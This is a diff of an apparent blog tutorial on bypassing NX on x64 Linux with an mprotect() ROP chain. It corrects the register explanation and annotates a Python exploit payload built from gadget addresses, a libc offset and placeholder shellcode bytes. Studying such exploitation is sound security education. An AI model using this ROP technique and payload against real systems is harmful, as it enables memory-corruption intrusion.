@@ -90,13 +90,17 @@ PROT_EXEC: The memory can be executed.
 ...
 ~~~
 
-We will set address to **0x7fffffffe000** (I take it from gdb, our 'A's are at  address **0x7fffffffe168**), the value **0x1000** as length and the protection to **RWX**, which is **0x7**.
+Because our 'A's are at address **0x7fffffffe168**,  we will set the **addr** parameter to an address before our 'A's, I choose the address **0x7fffffffe000**.
+
+![Screenshot]({{ site.baseurl }}/images/2020-08-25-elfx64-bypass-nx-with-mprotect/img11.0.png)
+
+We set the **len** parameter to **0x1000** (it's enough from address **0x7fffffffe000** to our shellcode) and the **prot** parameter to **RWX**, which is **0x7**.
 
 The calling convention for ELF 64 is the following: 
 * Arguments in RDI, RSI, RDX, RCX, R8, R9 
 * Return Value in RAX 
 
-So we need to put the stack address in the **RDI** register, the length in the **RDX** register and the value **0x7** in the **RCX** register.
+So we need to put the stack address in the **RDI** register, the length in the **RSI** register and the value **0x7** in the **RDX** register.
 
 Using gdb, it is possible to find the **mprotect()** address.
 
@@ -105,6 +109,8 @@ Using gdb, it is possible to find the **mprotect()** address.
 Using [ROPgadget](https://github.com/JonathanSalwan/ROPgadget), we can find the gadgets we need to put the values into the registers.
 
 ![Screenshot]({{ site.baseurl }}/images/2020-08-25-elfx64-bypass-nx-with-mprotect/img13.png)
+
+The "pop rsi" gadget is followed by a "pop r15" instruction before the "ret", for this reason we must set a garbage value for the "pop r15" instruction.
 
 There is no “pop rdx” instruction in our binary, we can look for it into the libc.
 
@@ -133,12 +139,12 @@ payload += p64(0x00000000004011fb) # pop rdi ; ret
 payload += p64(0x7fffffffe000) # stack address
 payload += p64(0x00000000004011f9) # pop rsi ; pop r15 ; ret
 payload += p64(0x1000) # size
-payload += p64(0xAAAAAAAAAAAAAAAA) #garbage for r15
-payload += p64(libc_address+0x000000000003fa6a) # pop rdx ; ret
+payload += p64(0xAAAAAAAAAAAAAAAA) # garbage for r15
+payload += p64(libc_address+0x000000000003fa6a) # pop rdx ; ret from libc
 payload += p64(0x7) #mode
 payload += p64(0x7ffff7eea1e0) # mprotect address
-payload += “B” * 8
-payload += "C” * 200
+payload += “B” * 8 # shellcode address
+payload += "C” * 200 #shellcode
 raw_input()
 
 p.sendline(payload)
